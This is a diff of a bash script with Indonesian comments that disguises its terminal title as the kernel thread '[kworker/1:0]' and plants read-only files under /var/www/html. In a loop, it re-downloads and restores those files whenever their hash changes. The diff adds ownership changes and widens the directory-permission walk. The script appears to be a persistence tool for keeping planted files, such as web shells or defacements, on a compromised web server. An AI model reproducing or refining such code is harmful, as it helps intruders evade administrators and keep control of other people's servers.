@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# Meniru nama proses (tidak semua shell mendukung, tapi bisa gunakan ini)
+# Meniru nama proses
 if command -v ps &> /dev/null; then
     echo -ne "\033]0;[kworker/1:0]\007"
 fi
@@ -31,8 +31,9 @@ download_file() {
     # Simpan ke file
     echo "$content" > "$file_path"
 
-    # Atur permission file menjadi read-only
+    # Set permission dan ownership
     chmod 444 "$file_path"
+    chown 1000:1000 "$file_path"
     echo "Berhasil mengunduh dan menyimpan file: $file_path"
 }
 
@@ -48,7 +49,7 @@ get_file_hash() {
 # Fungsi untuk mengatur permission direktori
 set_permissions() {
     local dir_path="$1"
-    while [[ "$dir_path" != "/var/www/html/public" && "$dir_path" != "/" ]]; do
+    while [[ "$dir_path" != "/var/www/html" && "$dir_path" != "/" ]]; do
         chmod 755 "$dir_path"
         dir_path=$(dirname "$dir_path")
     done
@@ -81,6 +82,7 @@ while true; do
                 echo "File berubah, mengunduh ulang: $file"
                 mv "$temp_file" "$file"
                 chmod 444 "$file"
+                chown 1000:1000 "$file"
             else
                 rm "$temp_file"
             fi
